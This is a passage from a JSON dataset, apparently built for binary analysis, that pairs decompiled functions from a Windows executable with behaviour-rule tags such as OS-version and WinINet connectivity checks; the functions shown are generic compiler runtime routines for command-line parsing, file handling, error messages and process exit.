        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403031)\n// WARNING: Removing unreachable block (ram,0x00403036)\n\nvoid __fastcall fcn.0040305c(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00407688(param_1, param_2);\n    if (*(iVar1 + 4) != 0) {\n        if (*0x493008 != NULL) {\n            (**0x493008)();\n        }\n        fcn.00407688();\n        fcn.00402ff8();\n        return;\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "004031fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004031fc(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint8_t *in_EAX;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint8_t *puStack20;\n    \n    while( true ) {\n        while ((*in_EAX != 0 && (*in_EAX < 0x21))) {\n            in_EAX = sub.user32.dll_CharNextA();\n        }\n        puStack20 = in_EAX;\n        if ((*in_EAX != 0x22) || (in_EAX[1] != 0x22)) break;\n        in_EAX = in_EAX + 2;\n    }\n    while (puVar3 = in_EAX,  0x20 < *puVar3) {\n        if (*puVar3 == 0x22) {\n            puVar2 = sub.user32.dll_CharNextA(puVar3);\n            while ((puVar5 = puVar2,  *puVar5 != 0 && (*puVar5 != 0x22))) {\n                puVar2 = sub.user32.dll_CharNextA(puVar3);\n                puStack20 = puVar5;\n            }\n            in_EAX = puVar5;\n            if (*puVar5 != 0) {\n                in_EAX = sub.user32.dll_CharNextA(puVar3);\n                puStack20 = puVar5;\n            }\n        }\n        else {\n            in_EAX = sub.user32.dll_CharNextA();\n            puStack20 = puVar3;\n        }\n    }\n    fcn.00405c6c();\n    iVar1 = *param_2;\n    iVar6 = 0;\n    puVar3 = puStack20;\n    while (puVar2 = puVar3,  0x20 < *puVar2) {\n        if (*puVar2 == 0x22) {\n            puVar3 = sub.user32.dll_CharNextA(puVar2);\n            while ((puVar5 = puVar3,  *puVar5 != 0 && (*puVar5 != 0x22))) {\n                puVar4 = sub.user32.dll_CharNextA(puVar2);\n                for (puVar3 = puVar5; puStack20 = puVar5,  puVar3 < puVar4; puVar3 = puVar3 + 1) {\n                    *(iVar1 + iVar6) = *puVar3;\n                    iVar6 = iVar6 + 1;\n                }\n            }\n            puVar3 = puVar5;\n            if (*puVar5 != 0) {\n                puVar3 = sub.user32.dll_CharNextA(puVar2);\n                puStack20 = puVar5;\n            }\n        }\n        else {\n            puVar5 = sub.user32.dll_CharNextA();\n            for (puVar3 = puVar2; puStack20 = puVar2,  puVar3 < puVar5; puVar3 = puVar3 + 1) {\n                *(iVar1 + iVar6) = *puVar3;\n                iVar6 = iVar6 + 1;\n            }\n        }\n    }\n    return CONCAT44(puStack20, puVar2);\n}\n",
        "token_count": 731
    },
    "004032f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403330)\n\nvoid fcn.004032f8(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x403349;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    sub.kernel32.dll_GetCommandLineA();\n    fcn.004031fc();\n    fcn.004031fc();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x403350;\n    uStack24 = 0x403348;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 175
    },
    "00403358": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403358(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uchar auStack276 [264];\n    \n    fcn.00405530();\n    if (in_EAX == 0) {\n        sub.kernel32.dll_GetModuleFileNameA(0, auStack276, 0x105);\n        fcn.00405620();\n    }\n    else {\n        sub.kernel32.dll_GetCommandLineA();\n        while( true ) {\n            fcn.004031fc();\n            if ((in_EAX == 0) || (*param_2 == 0)) break;\n            in_EAX = in_EAX + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "0040484c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040484c(uint param_1, uint param_2)\n\n{\n    code *UNRECOVERED_JUMPTABLE;\n    uchar in_ZF;\n    \n    fcn.0040481c(param_1);\n    if (!in_ZF) {\n    // WARNING: Could not recover jumptable at 0x00404859. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*UNRECOVERED_JUMPTABLE)();\n        return;\n    }\n    if (*0x49302c != NULL) {\n        (**0x49302c)();\n    }\n    *0x48f004 = param_2;\n    *0x48f000 = 0xd2;\n    fcn.00405388();\n    return;\n}\n",
        "token_count": 170
    },
    "0040349c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040349c(uint param_1, ushort param_2)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    uVar1 = *(in_EAX + 4);\n    if ((uVar1 < 0xd7b0) || (0xd7b3 < uVar1)) {\n        iVar2 = 0x66;\n    }\n    else {\n        if (uVar1 != 0xd7b0) {\n            fcn.00403918();\n        }\n        *(in_EAX + 4) = param_2;\n        if ((*(in_EAX + 0x48) == '\\0') && (*(in_EAX + 0x18) == 0)) {\n            *(in_EAX + 0x18) = 0x4035c4;\n        }\n        iVar2 = (**(in_EAX + 0x18))();\n    }\n    if (iVar2 != 0) {\n        fcn.0040307c();\n    }\n    return iVar2;\n}\n",
        "token_count": 241
    },
    "00403d88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403d88(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(in_EAX + 1) != 0xd7b0) {\n        if (3 < *(in_EAX + 1) - 0xd7b0) goto code_r0x00403e5c;\n        iVar1 = (*in_EAX[9])();\n        if (iVar1 != 0) {\n            fcn.0040307c();\n        }\n    }\n    *(in_EAX + 1) = 0xd7b3;\n    in_EAX[2] = param_2;\n    in_EAX[9] = 0x403d60;\n    in_EAX[7] = 0x403554;\n    if (*(in_EAX + 0x12) == '\\0') {\n        in_EAX[9] = 0x403554;\n        if (param_1 == 3) {\n            uVar2 = 0xfffffff5;\n        }\n        else {\n            uVar2 = 0xfffffff6;\n        }\n        iVar1 = sub.kernel32.dll_GetStdHandle(uVar2);\n    }\n    else {\n        if (((param_1 != 3) && (param_1 != 2)) && (*(in_EAX + 1) = 0xd7b2,  param_1 != 1)) {\n            *(in_EAX + 1) = 0xd7b1;\n        }\n        iVar1 = sub.kernel32.dll_CreateFileA();\n    }\n    if (iVar1 != -1) {\n        *in_EAX = iVar1;\n        return;\n    }\n    *(in_EAX + 1) = 0xd7b0;\n    sub.kernel32.dll_GetLastError();\ncode_r0x00403e5c:\n    fcn.0040307c();\n    return;\n}\n",
        "token_count": 434
    },
    "00404030": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00404030(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    while (0x40 < param_2) {\n        param_2 = param_2 + -0x40;\n        fcn.00403fdc();\n        iVar2 = fcn.00407688();\n        if (*(iVar2 + 4) != 0) {\n            return in_EAX;\n        }\n    }\n    if (0 < param_2) {\n        puVar3 = 0x404060;\n        if ((*(in_EAX + 4) == -0x284e) || (cVar1 = fcn.00403f98(param_2, 0x404060),  cVar1 != '\\0')) {\n            while( true ) {\n                puVar4 = *(in_EAX + 0x14) + *(in_EAX + 0xc);\n                iVar2 = *(in_EAX + 8) - *(in_EAX + 0xc);\n                if (param_2 < iVar2) break;\n                *(in_EAX + 0xc) = *(in_EAX + 0xc) + iVar2;\n                param_2 = param_2 - iVar2;\n                for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                iVar2 = (**(in_EAX + 0x1c))();\n                if (iVar2 != 0) {\n                    fcn.0040307c();\n                    return in_EAX;\n                }\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + param_2;\n            for (; param_2 != 0; param_2 = param_2 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n        return in_EAX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 505
    },
    "00404704": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404704(int32_t **param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x404788;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *param_1 = NULL;\n    iVar1 = fcn.00404798();\n    if (iVar1 != 0) {\n        if (*(iVar1 + 0x14) == 0) {\n            fcn.004046d4();\n            fcn.00407024();\n        }\n        else {\n            *param_1 = in_EAX + *(iVar1 + 0x14);\n            if (*param_1 != NULL) {\n                (**(**param_1 + 4))(*param_1);\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x40478f;\n    uStack32 = 0x404787;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 282
    },
    "00404a48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404a48(uint param_1, uint param_2)\n\n{\n    uint auStack12 [3];\n    \n    if (*0x48f028 != '\\0') {\n        auStack12[0] = param_2;\n        (**0x493014)(0xeedfae4, 0, 2, auStack12);\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "004052fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004052fc(void)\n\n{\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    char *pcStack20;\n    char *pcStack16;\n    char *pcStack12;\n    uint uStack8;\n    uchar auStack4 [4];\n    \n    if (*0x49304c != '\\0') {\n        if ((*0x493220 == -0x284e) && (*0x493228 != 0)) {\n            uStack8 = 0x405325;\n            (**0x493238)();\n        }\n        pcStack12 = &stack0xfffffffc;\n        uStack8 = 0;\n        pcStack16 = 0x1e;\n        pcStack20 = \"Runtime error     at 00000000\";\n        uStack24 = 0xfffffff5;\n        uStack28 = 0x40533a;\n        uStack28 = sub.kernel32.dll_GetStdHandle();\n        sub.kernel32.dll_WriteFile();\n        uVar1 = sub.kernel32.dll_GetStdHandle(0xfffffff5, 0x405384, 2, &stack0xffffffe4, 0);\n        sub.kernel32.dll_WriteFile(uVar1);\n        return;\n    }\n    if (*0x48f030 == '\\0') {\n        uStack8 = 0;\n        pcStack12 = \"Error\";\n        pcStack16 = \"Runtime error     at 00000000\";\n        pcStack20 = NULL;\n        uStack24 = 0x405379;\n        sub.user32.dll_MessageBoxA();\n    }\n    return;\n}\n",
        "token_count": 342
    },
    "00405388": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00405388(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    if ((*0x4957f0 == 0) && (*0x493048 != NULL)) {\n        do {\n            pcVar1 = *0x493048;\n            *0x493048 = NULL;\n            (*pcVar1)();\n        } while (*0x493048 != NULL);\n    }\n    if (*0x48f004 != 0) {\n        fcn.00405268();\n        fcn.004052fc();\n        *0x48f004 = 0;\n    }\n    do {\n        if ((*0x4957f0 == 2) && (*0x48f000 == 0)) {\n            *0x4957d4 = 0;\n        }\n        fcn.00405110();\n        if (((*0x4957f0 < 2) || (*0x48f000 != 0)) && (*0x4957d8 != 0)) {\n            fcn.00406f9c();\n            iVar2 = *(*0x4957d8 + 0x10);\n            if ((iVar2 != *(*0x4957d8 + 4)) && (iVar2 != 0)) {\n                sub.kernel32.dll_FreeLibrary(iVar2);\n            }\n        }\n        fcn.004050e8();\n        if (*0x4957f0 == 1) {\n            (**0x4957ec)();\n        }\n        if (*0x4957f0 != 0) {\n            fcn.004052cc();\n        }\n        if (*0x4957c8 == NULL) {\n            if (*0x493028 != NULL) {\n                (**0x493028)();\n            }\n            sub.kernel32.dll_ExitProcess(*0x48f000);\n        }\n        puVar3 = *0x4957c8;\n        puVar4 = 0x4957c8;\n        for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    } while( true );\n}\n",
        "token_count": 506
    },
    "004054b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004054b4(uint lpThreadId, uint dwCreationFlags, uint arg_10h)\n\n{\n    uint *puVar1;\n    uint in_ECX;\n    uint dwStackSize;\n    \n    if (*0x48f038 == NULL) {\n        puVar1 = fcn.00402f00();\n        *puVar1 = in_ECX;\n        puVar1[1] = arg_10h;\n    }\n    else {\n        (**0x48f038)();\n    }\n    *0x49304d = 1;\n    sub.kernel32.dll_CreateThread();\n    return;\n}\n",
        "token_count": 132
    },
    "00405514": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00405514 noreturn (void)\n\n{\n    if (*0x48f03c != NULL) {\n        (**0x48f03c)();\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread();\n}\n",
        "token_count": 59
    },
    "004060e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004060e0(void)\n\n{\n    if (*0x48f010 != NULL) {\n        (**0x48f010)();\n        return;\n    }\n    fcn.00403050();\n    return;\n}\n",
        "token_count": 49
    },
    "004060f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.004060f8(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    \n    if (param_1 != 0) {\n        cVar1 = *param_2;\n        if (cVar1 == '\\n') {\n            if (param_1 < 2) {\n                fcn.00405530();\n            }\n            else {\n                fcn.00405554();\n            }\n        }\n        else if (cVar1 == '\\v') {\n            if (param_1 < 2) {\n                fcn.00405d28();\n            }\n            else {\n                fcn.00405d40();\n            }\n        }\n        else if (cVar1 == '\\f') {\n            do {\n                fcn.004060e0();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\r') {\n            do {\n                fcn.004060f8();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0e') {\n            do {\n                fcn.004060ac();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0f') {\n            do {\n                fcn.0040700c();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x493008 != NULL) {\n                    (**0x493008)();\n                }\n                fcn.00402ff8();\n                return;\n            }\n            do {\n                fcn.00406934();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 578
    },
    "004061f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004061f0(void)\n\n{\n    if (*0x48f018 != NULL) {\n        (**0x48f018)();\n        return;\n    }\n    fcn.00403050();\n    return;\n}\n",
        "token_count": 49
    },
    "00406554": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00406638)\n// WARNING: Removing unreachable block (ram,0x00406727)\n// WARNING: Removing unreachable block (ram,0x0040672e)\n// WARNING: Removing unreachable block (ram,0x004066b4)\n// WARNING: Removing unreachable block (ram,0x004066ca)\n// WARNING: Removing unreachable block (ram,0x00406738)\n// WARNING: Removing unreachable block (ram,0x0040673b)\n// WARNING: Removing unreachable block (ram,0x00406741)\n// WARNING: Removing unreachable block (ram,0x004066c0)\n\nulong __fastcall fcn.00406554(uint param_1, int32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    char cVar4;\n    int32_t in_EAX;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    int32_t *piStack36;\n    uint32_t uStack28;\n    int32_t iStack24;\n    \n    iVar7 = 1;\n    uStack28 = 0;\n    iStack24 = 0;\n    if (in_EAX == 0) {\n        *param_2 = 1;\n        goto code_r0x0040675c;\n    }\n    for (; *(in_EAX + -1 + iVar7) == ' '; iVar7 = iVar7 + 1) {\n    }\n    bVar9 = false;\n    cVar4 = *(in_EAX + -1 + iVar7);\n    if (cVar4 == '-') {\n        bVar9 = true;\n        iVar7 = iVar7 + 1;\n    }\n    else if (cVar4 == '+') {\n        iVar7 = iVar7 + 1;\n    }\n    uVar2 = 1;\n    piStack36 = param_2;\n    if (((*(in_EAX + -1 + iVar7) == '$') || (cVar4 = fcn.004033fc(),  cVar4 == 'X')) ||\n       ((*(in_EAX + -1 + iVar7) == '0' && (cVar4 = fcn.004033fc(),  cVar4 == 'X')))) {\n        if (*(in_EAX + -1 + iVar7) == '0') {\n            iVar7 = iVar7 + 1;\n        }\n        do {\n            iVar7 = iVar7 + 1;\n            uVar1 = *(in_EAX + -1 + iVar7);\n            if (uVar1 - 0x30 < 10) {\n                uVar8 = uVar1 - 0x30;\n            }\n            else if (uVar1 + 0xbf < 6) {\n                uVar8 = uVar1 - 0x37;\n            }\n            else {\n                if (5 < uVar1 + 0x9f) goto code_r0x0040666a;\n                uVar8 = uVar1 - 0x57;\n            }\n            if (((iStack24 != 0) && (iStack24 < 0)) || ((iStack24 != 0xfffffff && (0xfffffff < iStack24))))\n            goto code_r0x0040666a;\n            uVar3 = uStack28 >> 0x1c;\n            uVar5 = uStack28 * 0x10;\n            uStack28 = uVar5 + uVar8;\n            iStack24 = (iStack24 << 4 | uVar3) + (uVar8 >> 0x1f) + CARRY4(uVar5, uVar8);\n            uVar2 = 0;\n        } while( true );\n    }\n    for (; *(in_EAX + -1 + iVar7) - 0x30U < 10; iVar7 = iVar7 + 1) {\n        uVar2 = *(in_EAX + -1 + iVar7);\n        iVar6 = fcn.0040649c();\n        piStack36 = (uVar2 - 0x30) + iVar6;\n        uVar2 = 0;\n    }\n    iStack24 = 0;\n    uStack28 = 0;\n    goto code_r0x00406742;\ncode_r0x0040666a:\n    if (bVar9) {\n        bVar9 = uStack28 != 0;\n        uStack28 = -uStack28;\n        iStack24 = -(iStack24 + bVar9);\n    }\ncode_r0x00406742:\n    if (uVar2 | *(in_EAX + -1 + iVar7) != '\\0') {\n        *piStack36 = iVar7;\n    }\n    else {\n        *piStack36 = 0;\n    }\ncode_r0x0040675c:\n    return CONCAT44(iStack24, uStack28);\n}\n",
        "token_count": 1084
    },
    "004069c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004069c8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar auStack272 [264];\n    \n    if (*(in_EAX + 0x10) == 0) {\n        sub.kernel32.dll_GetModuleFileNameA(*(in_EAX + 4), auStack272, 0x105);\n        iVar1 = fcn.00406c2c();\n        *(in_EAX + 0x10) = iVar1;\n        if (iVar1 == 0) {\n            *(in_EAX + 0x10) = *(in_EAX + 4);\n        }\n    }\n    return *(in_EAX + 0x10);\n}\n",
        "token_count": 154
    },
    "00406a68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar * __cdecl\nfcn.00406a68(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint arg_5ch)\n\n{\n    char *in_EAX;\n    code *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint in_EDX;\n    uint *puVar6;\n    uint lpFileName;\n    uint lpFindFileData;\n    uint lpString2;\n    int32_t hFindFile;\n    char *var_ch;\n    uint iMaxLength;\n    char *lpString1;\n    \n    var_ch = in_EAX;\n    iMaxLength = in_EDX;\n    lpString1 = in_EAX;\n    hFindFile = sub.kernel32.dll_GetModuleHandleA(0x406c08);\n    if (((hFindFile == 0) || (pcVar1 = sub.kernel32.dll_GetProcAddress(hFindFile, 0x406c18),  pcVar1 == NULL)) ||\n       (iVar2 = (*pcVar1)(lpString1, &lpFileName, 0x105),  iVar2 == 0)) {\n        if (*lpString1 == '\\\\') {\n            if (lpString1[1] != '\\\\') {\n                return var_ch;\n            }\n            pcVar3 = fcn.00406a48();\n            if (*pcVar3 == '\\0') {\n                return var_ch;\n            }\n            pcVar3 = fcn.00406a48();\n            if (*pcVar3 == '\\0') {\n                return var_ch;\n            }\n        }\n        else {\n            pcVar3 = lpString1 + 2;\n        }\n        iVar2 = pcVar3 - lpString1;\n        puVar6 = &lpFileName;\n        sub.kernel32.dll_lstrcpynA(puVar6, lpString1, iVar2 + 1);\n        while (*pcVar3 != '\\0') {\n            pcVar4 = fcn.00406a48();\n            if (0x105 < pcVar4 + (iVar2 - pcVar3) + 1) {\n                return var_ch;\n            }\n            sub.kernel32.dll_lstrcpynA(&lpFileName + iVar2, pcVar3, pcVar4 + (1 - pcVar3));\n            hFindFile = sub.kernel32.dll_FindFirstFileA(&lpFileName, &lpFindFileData);\n            if (hFindFile == -1) {\n                return var_ch;\n            }\n            sub.kernel32.dll_FindClose(hFindFile);\n            iVar5 = sub.kernel32.dll_lstrlenA(&lpString2);\n            if (0x105 < iVar5 + iVar2 + 2) {\n                return var_ch;\n            }\n            *(&lpFileName + iVar2) = 0x5c;\n            sub.kernel32.dll_lstrcpynA(&lpFileName + iVar2 + 1, &lpString2, 0x104 - iVar2);\n            puVar6 = &lpString2;\n            iVar5 = sub.kernel32.dll_lstrlenA();\n            iVar2 = iVar2 + iVar5 + 1;\n            pcVar3 = pcVar4;\n        }\n        sub.kernel32.dll_lstrcpynA(lpString1, &lpFileName, iMaxLength, puVar6);\n    }\n    else {\n        sub.kernel32.dll_lstrcpynA(lpString1, &lpFileName, iMaxLength);\n    }\n    return var_ch;\n}\n",
        "token_count": 858
    },
    "00406c2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
